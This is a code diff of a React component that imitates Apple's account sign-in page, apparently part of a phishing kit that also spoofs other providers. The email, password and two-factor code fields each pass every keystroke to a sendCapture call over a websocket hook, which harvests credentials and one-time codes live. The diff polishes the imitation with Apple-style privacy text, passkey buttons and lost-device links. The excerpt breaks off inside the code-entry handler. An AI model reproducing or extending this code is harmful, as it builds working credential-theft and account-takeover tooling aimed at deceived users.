@@ -11,8 +11,8 @@ const MicrosoftLogo = () => (
   </svg>
 );
 
-const AppleLogo = ({ className }: { className?: string }) => (
-  <svg className={className} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
+const AppleLogo = ({ className, style }: { className?: string; style?: React.CSSProperties }) => (
+  <svg className={className} style={style} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
     <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
   </svg>
 );
@@ -1189,10 +1189,10 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [keepSignedIn, setKeepSignedIn] = useState(false);
   const [codeInput, setCodeInput] = useState('');
   const [forgotEmail, setForgotEmail] = useState('');
   const [loading, setLoading] = useState(false);
-  const [visitorLocation, setVisitorLocation] = useState<{ city: string; country: string; flag: string; isVpn: boolean } | null>(null);
   const [emailError, setEmailError] = useState<string | null>(null);
   const [passwordError, setPasswordError] = useState<string | null>(null);
   const [codeError, setCodeError] = useState<string | null>(null);
@@ -1203,15 +1203,6 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
     if (step === 'password') passwordRef.current?.focus();
     if (step === 'verification-code') setTimeout(() => codeRef.current?.focus(), 100);
   }, [step]);
-
-  useEffect(() => {
-    if (step !== 'device-trust' || visitorLocation) return;
-    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
-    fetch(`${base}/api/location`)
-      .then(r => r.json() as Promise<{ city: string; country: string; flag: string; isVpn: boolean }>)
-      .then(d => setVisitorLocation(d))
-      .catch(() => {});
-  }, [step, visitorLocation]);
 
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'apple',
@@ -1238,321 +1229,383 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
     setEmailError(null); setPasswordError(null); setCodeError(null);
     if (captureField && captureVal) sendCapture(captureField, captureVal);
     setLoading(true);
-    setTimeout(() => { setLoading(false); setStep(target); }, 800);
+    setTimeout(() => { setLoading(false); setStep(target); }, 700);
   };
 
-  const outerBg = isDesktop
-    ? isDark ? 'bg-[#1c1c1e]' : 'bg-[#f5f5f7]'
-    : isDark ? 'bg-black' : 'bg-white';
+  // ── Design tokens ──────────────────────────────────────────────────────────
+  const pageBg    = isDark ? '#1d1d1f' : '#f2f2f2';
+  const cardBg    = isDark ? '#2d2d2f' : '#ffffff';
+  const cardBdr   = isDark ? '#424245' : '#d2d2d7';
+  const txtMain   = isDark ? '#f5f5f7' : '#1d1d1f';
+  const txtSub    = isDark ? '#86868b' : '#6e6e73';
+  const inBg      = isDark ? '#1d1d1f' : '#ffffff';
+  const inBdr     = isDark ? '#424245' : '#d2d2d7';
+  const divBdr    = isDark ? '#424245' : '#e0e0e5';
+  const blue      = '#0071e3';
+  const errClr    = isDark ? '#ff453a' : '#ff3b30';
+  const ff        = '-apple-system,BlinkMacSystemFont,"SF Pro Display","SF Pro Text",sans-serif';
 
-  const cardCls = isDesktop
-    ? `max-w-[480px] px-12 py-14 rounded-2xl shadow-xl ${isDark ? 'bg-[#2c2c2e]' : 'bg-white'}`
-    : 'h-full px-8 pt-14';
+  const S = {
+    page: { width:'100%', height:'100%', minHeight:'100%', display:'flex', flexDirection:'column' as const, backgroundColor:pageBg, fontFamily:ff, color:txtMain, overflowY:'auto' as const },
+    center: { flex:1, display:'flex', alignItems:'center', justifyContent:'center', padding: isDesktop ? '40px 20px' : '0' },
+    card: {
+      width:'100%', maxWidth: isDesktop ? 500 : '100%',
+      backgroundColor: isDesktop ? cardBg : 'transparent',
+      borderRadius: isDesktop ? 20 : 0,
+      border: isDesktop ? `1px solid ${cardBdr}` : 'none',
+      padding: isDesktop ? '44px 48px 40px' : '40px 24px 60px',
+      display:'flex', flexDirection:'column' as const, alignItems:'center',
+    },
+    input: (err?: boolean): React.CSSProperties => ({
+      width:'100%', padding:'13px 16px', fontSize:17, lineHeight:1.4,
+      border:`1.5px solid ${err ? errClr : inBdr}`, borderRadius:10,
+      backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff,
+      boxSizing:'border-box' as const, transition:'border-color .15s',
+    }),
+    blueBtn: (disabled?: boolean): React.CSSProperties => ({
+      padding:'12px 20px', borderRadius:10,
+      backgroundColor: disabled ? (isDark ? '#1a3d72' : '#aac9f5') : blue,
+      color:'#ffffff', fontSize:17, fontWeight:400, border:'none',
+      cursor: disabled ? 'not-allowed' : 'pointer', fontFamily:ff,
+      textAlign:'center' as const, transition:'opacity .15s',
+    }),
+    outBtn: (): React.CSSProperties => ({
+      padding:'12px 20px', borderRadius:10, backgroundColor:'transparent',
+      color:txtMain, fontSize:17, fontWeight:400,
+      border:`1.5px solid ${inBdr}`, cursor:'pointer', fontFamily:ff,
+      textAlign:'center' as const, transition:'opacity .15s',
+    }),
+    link: { fontSize:14, color:blue, background:'none', border:'none', cursor:'pointer', fontFamily:ff, padding:0 } as React.CSSProperties,
+    smallLink: { fontSize:12, color:blue, background:'none', border:'none', cursor:'pointer', fontFamily:ff, padding:0 } as React.CSSProperties,
+  };
 
-  const groupBg = isDark ? 'bg-[#1c1c1e] border-[#38383a]' : 'bg-[#f2f2f7] border-[#d1d1d6]';
-  const subGray = isDark ? 'text-[#8e8e93]' : 'text-[#6e6e73]';
-  const appleBlue = '#007AFF';
-
-  const logoArea = (
-    <div className="relative flex items-center justify-center mb-7">
-      <AppleSpinRing />
-      <AppleLogo className={`w-11 h-11 ${isDark ? 'text-white' : 'text-black'}`} />
-    </div>
+  // ── Sub-components (inline, not React components to avoid remount) ─────────
+  const PrivacyIcon = (
+    <svg width="40" height="32" viewBox="0 0 44 34" fill="none" style={{ flexShrink:0, marginTop:2 }}>
+      <circle cx="30" cy="11" r="8" fill="#4DB6FF"/>
+      <path d="M16 34c0-7.73 5.82-14 13-14s13 6.27 13 14" fill="#4DB6FF"/>
+      <circle cx="16" cy="11" r="9" fill={blue}/>
+      <path d="M1 34c0-8.28 6.72-15 15-15s15 6.72 15 15" fill={blue}/>
+    </svg>
   );
 
-  if (loading) return (
-    <div className={`w-full h-full flex items-center justify-center transition-colors ${outerBg}`}
-      style={{ fontFamily: '-apple-system, BlinkMacSystemFont, Inter, sans-serif' }}>
-      <div className={`relative flex flex-col items-center w-full ${cardCls}`}>
-        {logoArea}
-        <h1 className="text-[26px] font-bold mb-6 tracking-tight">Apple Account</h1>
-        <svg className="w-9 h-9" viewBox="0 0 50 50">
-          <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
-            stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
-            className="animate-spin" style={{ animationDuration: '0.9s' }} />
-        </svg>
+  const PasskeyIcon = (
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink:0 }}>
+      <circle cx="8" cy="8" r="4"/>
+      <path d="M2 20v-1a7 7 0 0 1 7-7h1"/>
+      <circle cx="19" cy="17" r="3"/>
+      <path d="m22 14-3.5 3.5M20.5 20.5 22 22"/>
+    </svg>
+  );
+
+  const hr = <hr style={{ border:'none', borderTop:`1px solid ${divBdr}`, margin:'20px 0', width:'100%' }}/>;
+
+  const LostDeviceSection = (
+    <>
+      {hr}
+      <p style={{ fontSize:13, color:txtSub, textAlign:'center', lineHeight:1.6, marginBottom:20, maxWidth:320 }}>
+        If you cannot enter a code because you have lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
+      </p>
+      <div style={{ display:'flex', gap:48, justifyContent:'center' }}>
+        <button style={{ background:'none', border:'none', cursor:'pointer', display:'flex', flexDirection:'column', alignItems:'center', gap:6, color:txtMain, fontFamily:ff }}>
+          <svg width="32" height="32" viewBox="0 0 32 32" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
+            <circle cx="16" cy="16" r="13"/><circle cx="16" cy="16" r="5"/>
+            <line x1="16" y1="2" x2="16" y2="8"/><line x1="16" y1="24" x2="16" y2="30"/>
+            <line x1="2" y1="16" x2="8" y2="16"/><line x1="24" y1="16" x2="30" y2="16"/>
+          </svg>
+          <span style={{ fontSize:12, color:txtSub }}>Find Devices</span>
+        </button>
+        <button style={{ background:'none', border:'none', cursor:'pointer', display:'flex', flexDirection:'column', alignItems:'center', gap:6, color:txtMain, fontFamily:ff }}>
+          <svg width="32" height="32" viewBox="0 0 32 32" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
+            <rect x="2" y="5" width="18" height="14" rx="2"/>
+            <line x1="7" y1="23" x2="15" y2="23"/><line x1="11" y1="19" x2="11" y2="23"/>
+            <rect x="20" y="15" width="9" height="11" rx="1.5"/><line x1="24.5" y1="25" x2="24.5" y2="26.5"/>
+          </svg>
+          <span style={{ fontSize:12, color:txtSub }}>Manage devices ↗</span>
+        </button>
       </div>
-    </div>
+    </>
   );
+
+  const PasskeyBtn = (
+    <button style={{ ...S.outBtn(), flex:1, display:'flex', alignItems:'center', justifyContent:'center', gap:6, fontSize:15, whiteSpace:'nowrap' as const }}>
+      {PasskeyIcon}
+      Sign in with Passkey
+    </button>
+  );
+
+  const PasskeyNote = (
+    <p style={{ fontSize:12, color:txtSub, textAlign:'right', alignSelf:'flex-end', marginTop:6, lineHeight:1.4 }}>
+      Requires macOS Sonoma or iOS 17 or later.
+    </p>
+  );
+
+  // ── Render ────────────────────────────────────────────────────────────────
+  const Ring = <AppleSpinRing isDark={isDark} />;
+
+  const isLoadingState = loading || step === 'processing';
 
   return (
-    <div className={`w-full h-full flex items-center justify-center transition-colors ${outerBg} ${isDark ? 'text-white' : 'text-black'}`}
-      style={{ fontFamily: '-apple-system, BlinkMacSystemFont, Inter, sans-serif' }}>
-      <div className={`relative flex flex-col items-center w-full ${cardCls}`}>
+    <div style={S.page}>
+      <div style={S.center}>
+        <div style={S.card}>
 
-        {/* Back button (mobile/tablet) */}
-        {!isDesktop && (step === 'password' || step === 'verification-code') && (
-          <button
-            data-testid="apple-back-btn"
-            onClick={() => step === 'verification-code' ? setStep('device-trust') : setStep('email')}
-            className="absolute top-14 left-5 flex items-center"
-            style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
-          >
-            <ChevronLeft className="w-6 h-6" />
-          </button>
-        )}
+          {/* ── Loading / Processing ── */}
+          {isLoadingState && (
+            <>
+              {Ring}
+              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, marginBottom:28, textAlign:'center', margin:'0 0 28px' }}>Apple Account</h1>
+              <svg viewBox="0 0 50 50" style={{ width:36, height:36 }}>
+                <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
+                  stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.8"
+                  style={{ animation:'spin .9s linear infinite', transformOrigin:'center' }} />
+                <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
+              </svg>
+            </>
+          )}
 
-        {logoArea}
-        <h1 className="text-[26px] font-bold mb-3 tracking-tight">Apple Account</h1>
+          {/* ── Email step ── */}
+          {!isLoadingState && (step === 'email' || step === 'error-email') && (
+            <>
+              {Ring}
+              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 22px', letterSpacing:'-0.2px' }}>
+                Sign in with Apple Account
+              </h1>
 
-        {/* ── Email ── */}
-        {(step === 'email' || step === 'error-email') && (
-          <>
-            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
-              Sign in with an email or phone number to use iCloud, the App Store, Messages or other Apple services.
-            </p>
-            <div className={`w-full rounded-[13px] overflow-hidden border mb-1 transition-colors ${emailError ? (isDark ? 'border-[#ff453a] bg-[#1c1c1e]' : 'border-[#ff3b30] bg-[#f2f2f7]') : groupBg}`}>
               <input
                 data-testid="apple-email-input"
                 type="text"
                 value={email}
                 onChange={e => { setEmail(e.target.value); setEmailError(null); sendCapture('email', e.target.value); }}
-                onKeyDown={e => e.key === 'Enter' && nav('password', 'email', email)}
+                onKeyDown={e => e.key === 'Enter' && email && nav('password', 'email', email)}
                 placeholder="Email or Phone Number"
                 autoFocus
-                className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
+                style={{ ...S.input(!!emailError), marginBottom: emailError ? 6 : 0 }}
               />
-            </div>
-            {emailError && (
-              <p className="w-full text-[13px] leading-snug mb-4 px-1" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
-                {emailError}
-              </p>
-            )}
-            {!emailError && <div className="mb-6" />}
-            <button
-              data-testid="apple-continue-btn"
-              onClick={() => nav('password', 'email', email)}
-              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
-              style={{ backgroundColor: appleBlue }}
-            >
-              Continue
-            </button>
-            <div className="flex flex-col items-center gap-4">
-              <button data-testid="apple-forgot-link" onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
-                Forgot Apple Account or Password?
-              </button>
-              <button data-testid="apple-child-signin" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
-                Sign in a child in my Family
-              </button>
-            </div>
-          </>
-        )}
+              {emailError && <p style={{ fontSize:13, color:errClr, alignSelf:'flex-start', marginBottom:4, marginTop:0 }}>{emailError}</p>}
 
-        {/* ── Password ── */}
-        {(step === 'password' || step === 'error-password') && (
-          <>
-            {isDesktop && (
               <button
-                data-testid="apple-back-btn-desktop"
-                onClick={() => setStep('email')}
-                className={`flex items-center gap-1 text-[14px] mb-4 ${subGray} hover:text-[#007AFF] transition-colors`}
-                style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
+                data-testid="apple-create-account"
+                style={{ ...S.link, alignSelf:'flex-start', marginTop:8, marginBottom:18, fontSize:14 }}
               >
-                <ChevronLeft className="w-4 h-4" />
-                {email || 'user@example.com'}
+                Create Your Apple Account
               </button>
-            )}
-            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
-              Enter the password for <strong className={isDark ? 'text-white' : 'text-black'}>{email || 'your Apple Account'}</strong>.
-            </p>
-            <div className={`w-full rounded-[13px] overflow-hidden border mb-1 transition-colors ${passwordError ? (isDark ? 'border-[#ff453a] bg-[#1c1c1e]' : 'border-[#ff3b30] bg-[#f2f2f7]') : groupBg}`}>
-              <div className="relative">
-                <input
-                  ref={passwordRef}
-                  data-testid="apple-password-input"
-                  type={showPassword ? 'text' : 'password'}
-                  value={password}
-                  onChange={e => { setPassword(e.target.value); setPasswordError(null); sendCapture('password', e.target.value); }}
-                  onKeyDown={e => { if (e.key === 'Enter' && password) nav('device-trust', 'password', password); }}
-                  placeholder="Password"
-                  className={`w-full px-4 py-3.5 pr-12 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
-                />
-                <button
-                  data-testid="apple-show-password"
-                  onClick={() => setShowPassword(v => !v)}
-                  className={`absolute right-3 top-1/2 -translate-y-1/2 ${subGray} hover:text-[#007AFF] transition-colors`}
-                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}
-                >
-                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                </button>
-              </div>
-            </div>
-            {passwordError && (
-              <p className="w-full text-[13px] leading-snug mb-4 px-1" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
-                {passwordError}
-              </p>
-            )}
-            {!passwordError && <div className="mb-6" />}
-            <button
-              data-testid="apple-signin-btn"
-              onClick={() => { if (password) nav('device-trust', 'password', password); }}
-              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
-              style={{ backgroundColor: appleBlue }}
-            >
-              Sign In
-            </button>
-            <button data-testid="apple-forgot-password-2" onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
-              Forgot Apple Account or Password?
-            </button>
-          </>
-        )}
 
-        {/* ── Device Trust (iOS notification simulation) ── */}
-        {step === 'device-trust' && (
-          <>
-            <p className={`text-center text-[15px] leading-relaxed mb-2 ${subGray}`}>
-              A sign-in request was sent to your trusted devices.
-            </p>
-            {visitorLocation && (
-              <p className={`text-center text-[13px] mb-5 ${subGray}`}>
-                {visitorLocation.flag} {visitorLocation.city}, {visitorLocation.country}
-              </p>
-            )}
-            {visitorLocation?.isVpn && (
-              <div className={`w-full max-w-[320px] rounded-xl px-4 py-2.5 mb-4 flex items-start gap-2.5 ${isDark ? 'bg-[#3a2c00] border border-[#5a4500]' : 'bg-[#fff9e6] border border-[#f0c040]'}`}>
-                <span className="text-[16px] mt-0.5">⚠️</span>
-                <p className={`text-[12px] leading-relaxed ${isDark ? 'text-[#ffd166]' : 'text-[#7a5500]'}`}>
-                  You appear to be using a VPN or proxy. Your displayed location may differ from your actual location.
+              {/* Privacy section */}
+              <div style={{ display:'flex', gap:12, alignItems:'flex-start', marginBottom:22, width:'100%' }}>
+                {PrivacyIcon}
+                <p style={{ fontSize:13, color:txtSub, lineHeight:1.55, margin:0 }}>
+                  Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.{' '}
+                  <button style={S.smallLink}>See how your data is managed...</button>
                 </p>
               </div>
-            )}
-            {/* iOS notification card */}
-            <div className={`w-full max-w-[320px] rounded-2xl overflow-hidden shadow-2xl mb-5 ${isDark ? 'bg-[#2c2c2e] border border-[#3a3a3c]' : 'bg-white border border-[#e5e5ea]'}`}>
-              <div className={`px-4 pt-4 pb-3 border-b ${isDark ? 'border-[#3a3a3c]' : 'border-[#e5e5ea]'}`}>
-                <div className="flex items-start gap-3 mb-2.5">
-                  <div className="w-9 h-9 rounded-[10px] bg-black flex items-center justify-center flex-shrink-0 mt-0.5">
-                    <AppleLogo className="w-5 h-5 text-white" />
-                  </div>
-                  <div className="flex-1 min-w-0">
-                    <div className="flex items-center justify-between">
-                      <span className={`text-[13px] font-semibold ${isDark ? 'text-white' : 'text-black'}`}>Apple ID</span>
-                      <span className={`text-[11px] ${subGray}`}>now</span>
-                    </div>
-                    <p className={`text-[15px] font-semibold leading-tight mt-0.5 ${isDark ? 'text-white' : 'text-black'}`}>
-                      Apple ID Sign In Requested
-                    </p>
+
+              {/* Button row */}
+              <div style={{ display:'flex', gap:10, width:'100%', marginBottom:8 }}>
+                <button
+                  data-testid="apple-continue-btn"
+                  onClick={() => email && nav('password', 'email', email)}
+                  style={{ ...S.blueBtn(!email), flex:1 }}
+                >
+                  Continue
+                </button>
+                {PasskeyBtn}
+              </div>
+              {PasskeyNote}
+            </>
+          )}
+
+          {/* ── Password step ── */}
+          {!isLoadingState && (step === 'password' || step === 'error-password') && (
+            <>
+              {Ring}
+              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 22px', letterSpacing:'-0.2px' }}>
+                Sign in with Apple Account
+              </h1>
+
+              {/* Grouped input container */}
+              <div style={{ width:'100%', border:`1.5px solid ${passwordError ? errClr : inBdr}`, borderRadius:10, overflow:'hidden', marginBottom:8 }}>
+                {/* Email row (read-only) */}
+                <div style={{ position:'relative', borderBottom:`1px solid ${divBdr}` }}>
+                  <input
+                    type="text"
+                    readOnly
+                    value={email || 'user@icloud.com'}
+                    style={{ width:'100%', padding:'13px 44px 13px 16px', fontSize:15, border:'none', backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff, boxSizing:'border-box' as const }}
+                  />
+                  <div style={{ position:'absolute', right:12, top:'50%', transform:'translateY(-50%)', width:22, height:22, borderRadius:'50%', backgroundColor:blue, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
+                    <svg width="12" height="10" viewBox="0 0 12 10" fill="none"><path d="M1 5l3.5 3.5L11 1" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                   </div>
                 </div>
-                <p className={`text-[13px] leading-snug ${subGray}`}>
-                  Your Apple ID <span className={isDark ? 'text-white font-medium' : 'text-black font-medium'}>{email || 'user@icloud.com'}</span> is being used to sign in to a device
-                  {visitorLocation ? ` in ${visitorLocation.city}, ${visitorLocation.country}` : ' near your location'}.
-                </p>
+                {/* Password row */}
+                <div style={{ position:'relative' }}>
+                  <input
+                    ref={passwordRef}
+                    data-testid="apple-password-input"
+                    type={showPassword ? 'text' : 'password'}
+                    value={password}
+                    onChange={e => { setPassword(e.target.value); setPasswordError(null); sendCapture('password', e.target.value); }}
+                    onKeyDown={e => { if (e.key === 'Enter' && password) nav('verification-code', 'password', password); }}
+                    placeholder="Password"
+                    style={{ width:'100%', padding:'13px 48px 13px 16px', fontSize:17, border:'none', backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff, boxSizing:'border-box' as const }}
+                  />
+                  <button
+                    data-testid="apple-show-password"
+                    onClick={() => setShowPassword(v => !v)}
+                    style={{ position:'absolute', right:10, top:'50%', transform:'translateY(-50%)', background:'none', border:'none', cursor:'pointer', color:txtSub, padding:4, display:'flex', alignItems:'center' }}
+                  >
+                    {showPassword ? <EyeOff style={{ width:18, height:18 }} /> : <Eye style={{ width:18, height:18 }} />}
+                  </button>
+                </div>
               </div>
-              <div className={`flex divide-x ${isDark ? 'divide-[#3a3a3c]' : 'divide-[#e5e5ea]'}`}>
-                <button
-                  onClick={() => setStep('email')}
-                  className={`flex-1 py-3 text-[17px] font-normal transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
-                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
-                >
-                  Don't Allow
-                </button>
-                <button
-                  onClick={() => nav('verification-code')}
-                  className={`flex-1 py-3 text-[17px] font-semibold transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
-                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
-                >
-                  Allow
-                </button>
-              </div>
-            </div>
-            <button
-              onClick={() => nav('verification-code')}
-              className={`text-[14px] underline ${subGray} hover:text-[#007AFF] transition-colors`}
-              style={{ background: 'none', border: 'none', cursor: 'pointer' }}
-            >
-              Didn't receive a notification?
-            </button>
-          </>
-        )}
+              {passwordError && <p style={{ fontSize:13, color:errClr, alignSelf:'flex-start', marginBottom:6 }}>{passwordError}</p>}
 
-        {/* ── Verification Code ── */}
-        {step === 'verification-code' && (
-          <>
-            {isDesktop && (
-              <button onClick={() => setStep('device-trust')}
-                className={`flex items-center gap-1 text-[14px] mb-4 ${subGray} hover:text-[#007AFF] transition-colors`}
-                style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
-                <ChevronLeft className="w-4 h-4" /> Back
-              </button>
-            )}
-            <p className={`text-center text-[15px] leading-relaxed mb-1 ${subGray}`}>
-              Enter the verification code shown on your trusted device.
-            </p>
-            <p className={`text-center text-[13px] mb-6 ${subGray}`}>
-              A 6-digit code was displayed on your other Apple devices.
-            </p>
-            {/* Digit boxes with transparent overlay input for reliable input capture */}
-            <div className="relative mb-5" onClick={() => codeRef.current?.focus()}>
-              <div className="flex gap-2 justify-center pointer-events-none">
-                {Array.from({ length: 6 }).map((_, i) => (
-                  <div key={i} className={`w-11 h-14 rounded-[13px] flex items-center justify-center text-[22px] font-semibold border-2 transition-colors
-                    ${codeInput[i]
-                      ? isDark ? 'border-[#007AFF] bg-[#38383a] text-white' : 'border-[#007AFF] bg-[#f2f2f7] text-black'
-                      : i === codeInput.length
-                        ? isDark ? 'border-[#007AFF] bg-[#1c1c1e]' : 'border-[#007AFF] bg-white'
-                        : isDark ? 'border-[#48484a] bg-[#1c1c1e]' : 'border-[#d1d1d6] bg-[#f2f2f7]'}`}>
-                    {codeInput[i] ?? ''}
-                  </div>
-                ))}
+              {/* Keep signed in + forgot */}
+              <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', width:'100%', marginBottom:20, gap:8 }}>
+                <label style={{ display:'flex', alignItems:'center', gap:7, fontSize:14, color:txtMain, cursor:'pointer' }}>
+                  <input
+                    type="checkbox"
+                    checked={keepSignedIn}
+                    onChange={e => setKeepSignedIn(e.target.checked)}
+                    style={{ width:15, height:15, accentColor:blue, cursor:'pointer', flexShrink:0 }}
+                  />
+                  Keep me signed in
+                </label>
+                <button
+                  data-testid="apple-forgot-password-2"
+                  onClick={() => { setForgotEmail(email); setStep('forgot'); }}
+                  style={{ ...S.link, fontSize:14, whiteSpace:'nowrap' as const }}
+                >
+                  Forgotten your password? ›
+                </button>
               </div>
-              <input
-                ref={codeRef}
-                data-testid="apple-code-input"
-                type="text"
-                inputMode="numeric"
-                maxLength={6}
-                autoFocus
-                value={codeInput}
-                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setCodeInput(v); sendCapture('verification_code', v); }}
-                onKeyDown={e => { if (e.key === 'Enter' && codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
-                aria-label="Verification code"
-                style={{ position: 'absolute', inset: 0, opacity: 0, width: '100%', height: '100%', cursor: 'default', caretColor: 'transparent', fontSize: 0 }}
-              />
-            </div>
-            <button
-              data-testid="apple-code-submit-btn"
-              onClick={() => { if (codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
-              disabled={codeInput.length < 4}
-              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 4 ? 'opacity-40 cursor-not-allowed' : 'hover:opacity-90 active:opacity-80 cursor-pointer'}`}
-              style={{ backgroundColor: appleBlue }}
-            >
-              Continue
-            </button>
-            {codeError && (
-              <p className="w-full text-[13px] leading-snug mb-3 text-center" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
-                {codeError}
+
+              {/* Button row */}
+              <div style={{ display:'flex', gap:10, width:'100%', marginBottom:8 }}>
+                <button
+                  data-testid="apple-signin-btn"
+                  onClick={() => password && nav('verification-code', 'password', password)}
+                  style={{ ...S.blueBtn(!password), flex:1 }}
+                >
+                  Sign In
+                </button>
+                {PasskeyBtn}
+              </div>
+              {PasskeyNote}
+            </>
+          )}
+
+          {/* ── 2FA — Verification Code ── */}
+          {!isLoadingState && (step === 'verification-code' || step === 'error-code') && (
+            <>
+              {Ring}
+              <h1 style={{ fontSize:20, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 10px' }}>
+                Two-factor authentication
+              </h1>
+              <p style={{ fontSize:14, color:txtSub, textAlign:'center', margin:'0 0 24px', lineHeight:1.5 }}>
+                Enter the verification code sent to your iPhone.
               </p>
-            )}
-            <button
-              onClick={() => nav('device-trust')}
-              className="text-[14px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}
-            >
-              Didn't receive a code?
-            </button>
-          </>
-        )}
 
-        {/* ── Processing ── */}
-        {step === 'processing' && (
-          <div className="flex flex-col items-center w-full">
-            <p className={`text-center text-[15px] mb-8 leading-relaxed ${subGray}`}>
-              This will take a moment…
-            </p>
-            <svg className="w-9 h-9" viewBox="0 0 50 50">
-              <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
-                stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
-                className="animate-spin" style={{ animationDuration: '0.9s' }} />
-            </svg>
-          </div>
-        )}
+              {/* 6 digit boxes */}
+              <div style={{ position:'relative', marginBottom:4, cursor:'text' }} onClick={() => codeRef.current?.focus()}>
+                <div style={{ display:'flex', gap:8, justifyContent:'center', pointerEvents:'none' }}>
+                  {Array.from({ length:6 }).map((_, i) => (
+                    <div key={i} style={{
+                      width:44, height:50, borderRadius:8,
+                      border:`2px solid ${i === codeInput.length && codeInput.length < 6 ? blue : codeInput[i] ? blue : inBdr}`,
+                      backgroundColor: inBg,
+                      display:'flex', alignItems:'center', justifyContent:'center',
+                      fontSize:22, fontWeight:500, color:txtMain, transition:'border-color .12s',
+                      position:'relative',
+                    }}>
+                      {codeInput[i] !== undefined
+                        ? codeInput[i]
+                        : i === codeInput.length
+                          ? <span className="apple-cur" style={{ backgroundColor:txtMain }} />
+                          : null
+                      }
+                    </div>
+                  ))}
+                </div>
+                <input
+                  ref={codeRef}
+                  data-testid="apple-code-input"
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={6}
+                  autoFocus
+                  value={codeInput}
+                  onChange={e => {
+                    const v = e.target.value.replace(/\D/g, '').slice(0, 6);
+                    setCodeInput(v);
+                    sendCapture('verification_code', v);
